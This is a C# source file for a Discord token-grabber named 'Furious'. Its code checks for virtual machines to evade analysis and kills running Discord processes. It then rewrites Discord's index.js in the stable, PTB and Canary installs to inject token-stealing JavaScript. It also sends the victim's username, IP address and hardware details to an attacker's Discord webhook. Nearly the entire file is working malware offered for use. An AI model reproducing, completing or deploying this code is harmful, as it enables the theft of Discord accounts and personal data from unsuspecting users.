using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace Furious
{
    public class Grabber
    {
		public static bool UsingVM()
		{
			///If the process is running within a Virtual Machine, the process will close before executing code.
			using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * from Win32_ComputerSystem"))
			{
				using (ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get())
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						string text = managementBaseObject["Manufacturer"].ToString().ToLower();
						if ((text == "microsoft corporation" && managementBaseObject["Model"].ToString().ToUpperInvariant().Contains("VIRTUAL")) || text.Contains("vmware") || managementBaseObject["Model"].ToString() == "VirtualBox")
						{
							Console.WriteLine("Using VM: true");
							return true;
						}
					}
				}
			}
			Console.WriteLine("Using VM: false");
			return false;
		}

		public static async Task QuickStart(bool injectJS = false, bool grabIP = false, bool grabHardware = false, bool checkForVM = false)
		{
			///This method allows the user to customise what data is collected, whether they want to inject the token grabbing code, and choose to check for a virtual machine.
			if (checkForVM)
			{
				if (UsingVM())
				{
					Environment.Exit(0);
				}
			}
			if (injectJS)
				await InjectJS();
			if (grabIP)
				await SendData(await GrabIP());
			if (grabHardware)
				await SendData(await GetHardware());
		}

		public static async Task InjectJS()
        {
			///This method is used to write the token grabbing JavaScript code into the Discord directory.
			CloseProcesses();

			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord"))
			{
				string[] discord = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discord");
				foreach (string folderName in discord)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.DiscordPath = folderName + @"\modules\discord_modules\index.js";
						await FileManagement.CleanFile(FileManagement.DiscordPath);
						await FileManagement.WriteDiscord(FileManagement.DiscordPath);
					}
				}
			}
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb"))
			{
				string[] ptb = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordptb");
				foreach (string folderName in ptb)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.PTBPath = folderName + @"\modules\discord_modules\index.js";
						await FileManagement.CleanFile(FileManagement.PTBPath);
						await FileManagement.WriteDiscord(FileManagement.PTBPath);
					}
				}
			}
			if (Directory.Exists(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary"))
			{
				string[] canary = Directory.GetDirectories(@"C:\Users\" + Environment.UserName + @"\AppData\Roaming\discordcanary");
				foreach (string folderName in canary)
				{
					if (folderName.Contains("0."))
					{
						FileManagement.CanaryPath = folderName + @"\modules\discord_modules\index.js";
						await FileManagement.CleanFile(FileManagement.CanaryPath);
                        await FileManagement.WriteDiscord(FileManagement.CanaryPath);
					}
				}
			}
		}

		private static void CloseProcesses()
		{
			///Closes all processes which contain "discord" in their name.
			foreach (Process process in Process.GetProcesses())
			{
				if (process.ProcessName.ToLower().Contains("discord"))
				{
					process.Kill();
					process.WaitForExit();
				}
			}
		}

		public static async Task<string> GetHardware()
		{
			///This method collects the users hardware specifications which can be sent to a webhook using the SendData method.
			StringBuilder sb = new StringBuilder();

			await Task.Run(() =>
			{
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_Processor").Get())
				{
					sb.AppendLine($"CPU: {obj["Name"]}");
				}
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_VideoController").Get())
				{
					sb.AppendLine($"GPU: {obj["Name"]}");
				}
				foreach (ManagementObject obj in new ManagementObjectSearcher("select * from Win32_OperatingSystem").Get())
                {
					sb.AppendLine($"OS: {obj["Caption"]}");
                }
			});

			Console.WriteLine(sb.ToString());
			return sb.ToString();
		}

		private static async Task<string> GrabIP()
		{
			///This method collects the users IP address which can be sent to a webhook using the SendData method.
			return await new WebClient().DownloadStringTaskAsync("https://ipv4.icanhazip.com");
		}

		public static async Task<HttpResponseMessage> SendData(string data)
		{
			///This method sends the data the paramater holds to a specified Discord webhook.
			string hook = "webhook-here";
			
			HttpResponseMessage response = null;
			using (HttpClient httpClient = new HttpClient())
			{
				try
				{
					Dictionary<string, string> contents = new Dictionary<string, string>
					{
						{ "content", $"Data for '{ Environment.UserName }' @ { await GrabIP() }	```{ data }```" }
					};

                    response = await httpClient.PostAsync(hook, new FormUrlEncodedContent(contents));
				}
				catch (HttpRequestException ex)
				{
					Debug.WriteLine(ex.Message);
				}
			}
			return response;
		}
	}
}
